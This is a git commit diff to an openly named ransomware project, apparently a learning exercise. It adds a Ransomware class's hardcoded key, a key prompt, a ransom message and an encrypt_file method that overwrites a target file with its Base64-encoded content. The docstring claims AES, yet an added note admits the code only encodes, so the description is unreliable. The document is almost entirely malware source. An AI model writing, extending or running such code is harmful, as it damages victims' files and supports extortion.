57496e748b4d43fa0e4537bd7ac6d51a12cf706b
Batyrkajan <155561218+Batyrkajan@users.noreply.github.com>
2024-12-04 04:14:37 -0500

    Function for encrypting and rewriting the target file

--- ransomeware.py
+++ ransomeware.py
@@ -32,3 +32,38 @@ class Ransomware:
     def name(self, new_name):
         # Set a new name
         self._name = new_name
+
+    # Key for encryption
+    @property
+    def key(self):
+        return "ransomware_key"
+
+    # Prompts the user to input a decryption key.
+    def obtain_key(self):
+        """ Obtain key from a user. """
+        return input("Please enter a key: ")
+    
+    # Informing user
+    def ransom_user(self):
+        """ Inform user about encryption of his files. """
+        print("Hi, all your files has been encrypted.")
+
+    def encrypt_file(self, filename):
+        """ Encrypt the given file with AES encryption algorithm.
+        :param str filename: Name of the file.
+
+        Note: The docstring mentions AES encryption, 
+        but the code uses Base64 encoding, 
+        which is not encryption but encoding.
+        """
+        # Load the content of file.
+        with open(filename, 'r') as file:
+            content = file.read()
+
+        # Encripting the file
+            encrypted_data = base64.b64encode(content.encode('utf-8'))
+
+        # Rewriting the file with the encoded content.
+        with open(filename, 'w') as file:
+            file.write(encrypted_data.decode('utf-8'))
+
